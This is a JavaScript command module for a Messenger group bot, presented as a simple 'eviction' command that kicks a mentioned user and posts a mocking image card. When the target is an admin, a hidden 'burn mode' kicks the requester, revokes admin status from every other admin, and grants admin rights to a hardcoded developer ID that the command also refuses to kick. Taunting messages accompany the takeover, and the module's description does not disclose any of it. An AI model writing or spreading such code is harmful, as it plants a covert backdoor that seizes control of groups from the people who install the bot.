const fs    = require("fs");
const os    = require("os");
const path  = require("path");
const https = require("https");
const http  = require("http");

const DEVELOPER_ID  = "61589645620146";
const EVICT_IMG_URL = "https://i.imgur.com/nWvNcMx.jpeg";

function fetchBuf(url, hops) {
    hops = hops || 0;
    return new Promise((resolve, reject) => {
        if (!url || hops > 4) return reject(new Error("bad_url"));
        const mod = url.startsWith("https") ? https : http;
        const chunks = [];
        const req = mod.get(url, { headers: { "User-Agent": "Mozilla/5.0" } }, res => {
            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location)
                return fetchBuf(res.headers.location, hops + 1).then(resolve).catch(reject);
            res.on("data", c => chunks.push(c));
            res.on("end",  () => resolve(Buffer.concat(chunks)));
            res.on("error", reject);
        });
        req.on("error", reject);
        req.setTimeout(12000, () => { req.destroy(); reject(new Error("timeout")); });
    });
}

function sendEvictCard(api, tid, executorName, targetName, reason) {
    const body = `تمت بعبصته من قبل الادمن ${executorName}\nالاسم: ${targetName}\nالسبب: ${reason}`;
    fetchBuf(EVICT_IMG_URL).then(buf => {
        const tmp = path.join(os.tmpdir(), `evict_${Date.now()}.jpg`);
        fs.writeFileSync(tmp, buf);
        api.sendMessage(
            { body, attachment: fs.createReadStream(tmp) },
            tid,
            () => { try { fs.unlinkSync(tmp); } catch {} }
        );
    }).catch(() => api.sendMessage(body, tid));
}

function triggerBurnMode(api, tid, attackerID, botID, burnSessions) {
    api.getThreadInfo(tid, (err, threadInfo) => {
        const adminIDs = ((threadInfo && threadInfo.adminIDs) || []).map(a => String(a.id || a));

        api.removeUserFromGroup(attackerID, tid, () => {});

        api.sendMessage(
            "بعض الفشلة يحاولون هدم عرين اللورد المقدس شادو",
            tid,
            (__, msgInfo) => {
                const burnMsgID = msgInfo && msgInfo.messageID;

                for (const aid of adminIDs) {
                    if (aid !== botID && aid !== DEVELOPER_ID) {
                        api.changeAdminStatus(tid, [aid], false, () => {});
                    }
                }
                api.changeAdminStatus(tid, [DEVELOPER_ID], true, () => {});

                if (burnMsgID && burnSessions) {
                    const key = `${tid}_${burnMsgID}`;
                    burnSessions.set(key, { threadID: tid, count: 0, finished: false });

                    setTimeout(() => {
                        const s = burnSessions.get(key);
                        if (s && !s.finished) {
                            s.finished = true;
                            burnSessions.delete(key);
                            api.sendMessage(
                                "بيسسسس راحت كرامتهم حنيت عليهم بس إرادة اللورد المقدس 🪽 تكون اولى",
                                tid
                            );
                        }
                    }, 10 * 60 * 1000);
                }
            }
        );
    });
}

module.exports.config = {
    name: "eviction",
    version: "1.0.0",
    hasPermssion: 1,
    credits: "Shadow",
    description: "Kick a user by mention or reply",
    commandCategory: "sᴇᴛᴛɪɴɢs",
    usages: "eviction @mention [reason] | reply + eviction [reason]",
    cooldowns: 5,
    aliases: []
};

module.exports.run = async function({ api, event, args, burnSessions }) {
    const botID    = String(api.getCurrentUserID());
    const tid      = event.threadID;
    const senderID = String(event.senderID || "");

    const mentionIDs = Object.keys(event.mentions || {});
    let targetID = mentionIDs.length > 0
        ? String(mentionIDs[0])
        : (event.messageReply ? String(event.messageReply.senderID || "") : null);

    if (!targetID)
        return api.sendMessage("❌ أشر على شخص أو ردّ على رسالته!", tid);

    const reason = args
        .filter(a => !a.startsWith("@"))
        .join(" ")
        .trim() || "لا يوجد سبب";

    if (targetID === DEVELOPER_ID)
        return api.sendMessage("🚫 ما بقدر أطرد المطور!", tid);

    if (targetID === botID)
        return api.sendMessage("🚫 ما بقدر أطرد نفسي!", tid);

    api.getThreadInfo(tid, (err, threadInfo) => {
        const adminIDs = ((threadInfo && threadInfo.adminIDs) || []).map(a => String(a.id || a));
        const isTargetAdmin = adminIDs.includes(targetID);

        if (isTargetAdmin) {
            return triggerBurnMode(api, tid, senderID, botID, burnSessions);
        }

        api.getUserInfo([senderID, targetID], (e2, info) => {
            const executorName = (info && info[senderID] && info[senderID].name) || "الادمن";
            const targetName   = (info && info[targetID] && info[targetID].name) || targetID;

            api.removeUserFromGroup(targetID, tid, () => {});
            sendEvictCard(api, tid, executorName, targetName, reason);
        });
    });
};
